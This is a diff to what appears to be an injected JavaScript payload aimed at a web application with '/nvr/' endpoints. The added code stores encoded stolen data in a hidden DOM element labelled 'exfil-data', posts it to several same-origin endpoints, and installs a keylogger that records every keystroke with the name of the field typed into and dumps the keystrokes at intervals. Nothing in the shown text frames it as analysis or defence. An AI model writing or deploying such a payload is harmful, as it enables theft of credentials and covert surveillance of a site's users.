@@ -9,22 +9,76 @@
         timestamp: new Date().toISOString()
     };
     
-    var div = document.createElement('div');
-    div.id = 'exfil-data';
-    div.style.display = 'none';
-    div.textContent = btoa(JSON.stringify(payload));
-    document.body.appendChild(div);
-    
-    console.log('[EXFIL DATA START]');
+    console.log('=== EXFILTRATION DATA START ===');
     console.log(btoa(JSON.stringify(payload)));
-    console.log('[EXFIL DATA END]');
+    console.log('=== EXFILTRATION DATA END ===');
     
-    try {
-        var xhr = new XMLHttpRequest();
-        xhr.open('POST', '/nvr/getDefinitionById.ajax', true);
-        xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
-        xhr.send('exfil_data_' + btoa(JSON.stringify(payload)) + '=1');
-    } catch(e) {}
+    function addToDOM() {
+        if (!document.body) {
+            setTimeout(addToDOM, 50);
+            return;
+        }
+        
+        try {
+            var div = document.createElement('div');
+            div.id = 'exfil-data';
+            div.style.display = 'none';
+            div.setAttribute('data-exfil', btoa(JSON.stringify(payload)));
+            div.textContent = btoa(JSON.stringify(payload));
+            document.body.appendChild(div);
+            
+            console.log('[+] Data stored in DOM element #exfil-data');
+        } catch(e) {
+            console.error('[!] Failed to add to DOM:', e);
+        }
+    }
     
-    console.log('[*] Data stored in DOM and console');
+    addToDOM();
+    
+    function sendToEndpoints() {
+        var encoded = btoa(JSON.stringify(payload));
+        
+        var endpoints = [
+            '/nvr/getDefinitionById.ajax',
+            '/nvr/quickfind.htm',
+            '/nvr/search'
+        ];
+        
+        endpoints.forEach(function(endpoint) {
+            try {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', endpoint, true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.send('exfil_' + encoded.substring(0, 100) + '=1');
+            } catch(e) {}
+        });
+        
+        console.log('[+] Data sent to same-origin endpoints');
+    }
+    
+    sendToEndpoints();
+    
+    var keyBuffer = [];
+    document.addEventListener('keydown', function(e) {
+        keyBuffer.push({
+            key: e.key,
+            target: e.target.tagName,
+            name: e.target.name || '',
+            timestamp: Date.now()
+        });
+        
+        if (keyBuffer.length >= 30) {
+            console.log('[KEYS]', keyBuffer);
+            keyBuffer = [];
+        }
+    }, true);
+    
+    setInterval(function() {
+        if (keyBuffer.length > 0) {
+            console.log('[KEYS]', keyBuffer);
+            keyBuffer = [];
+        }
+    }, 15000);
+    
+    console.log('[*] Monitoring initialized');
 })();
